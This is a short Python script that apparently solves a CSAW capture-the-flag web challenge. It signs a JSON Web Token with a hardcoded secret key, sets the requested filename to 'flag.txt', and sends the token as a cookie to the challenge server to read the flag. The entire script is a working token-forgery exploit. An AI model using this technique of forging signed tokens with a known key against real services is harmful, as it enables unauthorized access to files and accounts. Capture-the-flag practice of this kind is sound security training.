#!/usr/bin/env python3

import jwt
import requests

secret = 'super_secret_k3y'
json = {'filename': 'flag.txt'}
token = jwt.encode(json, secret, algorithm='HS256').decode()

#print(token)

url = 'http://web.red.csaw.io:5013/flag.txt'
cookie = {'jwt':token}
r = requests.get(url, cookies=cookie)

print(r.text.strip())
